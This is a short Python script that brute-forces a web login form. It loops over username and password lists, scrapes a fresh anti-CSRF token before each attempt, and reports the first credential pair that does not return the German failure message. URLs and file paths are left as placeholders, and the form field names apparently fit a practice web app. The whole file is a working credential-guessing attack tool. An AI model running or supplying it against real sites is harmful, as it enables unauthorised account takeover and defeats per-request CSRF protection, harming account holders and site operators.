#!/usr/bin/env python3
import requests
import re
import sys

def bruteforcer():
        session = requests.session()
        # Get password list, Change list to desired one
        with open("[Insert Password list]", "r") as file:
                passwords = [line.strip() for line in file.readlines()]
        # Get username list, Change list to desired one
        with open("[Insert Username list]", "r") as file:
                usernames = [line.strip() for line in file.readlines()]

        # Send requests
        for username in usernames:
                for password in passwords:
                        # Set url to desired one to read out the anti-csrf token
                        login = session.get("[Get token]")

                        # Read out csrf token in form, Set "csrf_token" to given key of token
                        user_token = re.search("'csrf_token' value='(.*?)'", login.text).group(1)
                        
                        # Set post data, key value pair maybe differs in every webapp
                        post_data = {
                                "username" : username,
                                "password" : password,
                                "Login" : "Login",
                                "user_token" : user_token
                        }

                        # Set url to desired one to send post request
                        validation = session.post("[Post request url]", data=post_data)

                        # Validation, set the text to the one which matches with response
                        if "Login fehlgeschlagen" in validation.text:
                                #print("Nope")
                                pass
                        elif "CSRF token" in validation.text:
                                print("CSRF problem")
                                sys.exit()
                        else:
                                print(f"gotcha!\n {username}:{password}")
                                sys.exit()

if __name__ == ("__main__"):
        print("start")
        bruteforcer()
        print("stop")